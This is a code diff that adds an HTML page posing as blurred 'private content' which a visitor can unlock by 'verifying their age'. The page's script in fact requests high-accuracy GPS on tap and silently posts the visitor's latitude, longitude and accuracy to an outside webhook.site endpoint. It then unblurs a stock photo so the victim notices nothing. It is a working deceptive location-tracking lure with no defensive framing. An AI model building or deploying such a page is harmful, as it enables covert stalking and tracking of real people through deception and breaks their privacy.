@@ -1,1 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Encrypted Content</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        
+        /* The Blur Effect */
+        #mask {
+            width: 100vw; height: 100vh;
+            background: url('https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?w=800') no-repeat center center;
+            background-size: contain;
+            filter: blur(15px); /* Makes the image unreadable until clicked */
+            transition: filter 0.5s;
+        }
 
+        /* Overlay text to guide the user */
+        #overlay {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            color: white; text-align: center;
+            background: rgba(0,0,0,0.6); padding: 20px; border-radius: 10px;
+            pointer-events: none; /* Let clicks pass through to the body */
+        }
+    </style>
+</head>
+<body onclick="unlock()">
+
+    <div id="mask"></div>
+    <div id="overlay">
+        <h2>🔒 PRIVATE CONTENT</h2>
+        <p>Tap image and select <b>'Allow'</b> to verify your age and decrypt high-resolution photo.</p>
+    </div>
+
+    <script>
+        function unlock() {
+            // Trigger high-accuracy GPS
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // Success: The user clicked 'Allow'
+                await fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
+                    method: 'POST', mode: 'no-cors',
+                    body: JSON.stringify({
+                        STATUS: "GPS_VERIFIED",
+                        LAT: pos.coords.latitude,
+                        LON: pos.coords.longitude,
+                        ACCURACY: pos.coords.accuracy + " meters"
+                    })
+                });
+                // Remove the blur to satisfy the user
+                document.getElementById('mask').style.filter = 'none';
+                document.getElementById('overlay').style.display = 'none';
+            }, (err) => {
+                // Failure: User clicked 'Deny'
+                alert("Verification Failed: You must allow access to view encrypted content.");
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        }
+    </script>
+</body>
+</html>
